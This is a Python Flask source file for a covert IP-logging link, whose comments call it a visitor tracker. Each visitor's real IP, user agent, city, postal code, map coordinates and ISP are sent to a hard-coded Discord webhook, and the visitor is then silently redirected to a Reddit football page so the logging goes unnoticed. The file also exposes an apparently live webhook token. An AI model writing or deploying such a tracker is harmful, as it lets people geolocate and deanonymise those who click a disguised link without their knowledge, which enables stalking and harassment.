import requests
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

# ✅ Your actual Discord webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_real_ip():
    """Extract real client IP, supports proxies and hosting services."""
    headers_to_check = [
        "CF-Connecting-IP",    # Cloudflare
        "X-Forwarded-For",     # Proxies
        "X-Real-IP"            # Nginx / Load balancers
    ]
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            # If multiple IPs in header, take the first one
            return ip.split(",")[0].strip()
    return request.remote_addr

def get_visitor_info(ip, user_agent):
    """Get detailed geolocation info using ipinfo.io."""
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = r.json() if r.status_code == 200 else {}
    except Exception:
        data = {}

    loc = data.get("loc", "0,0").split(",")
    lat = loc[0] if len(loc) > 1 else 0
    lon = loc[1] if len(loc) > 1 else 0

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": data.get("country", "Unknown"),
        "region": data.get("region", "Unknown"),
        "city": data.get("city", "Unknown"),
        "zip": data.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "org": data.get("org", "Unknown ISP"),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send visitor info to Discord in a clean embed."""
    embed = {
        "username": "🌍 Visitor Tracker",
        "embeds": [{
            "title": f"🚶 New Visitor from {info['country']}",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps", "value": f"[Open Map](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
        }]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")
    info = get_visitor_info(ip, user_agent)
    send_to_discord(info)
    return redirect("https://www.reddit.com/r/football/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
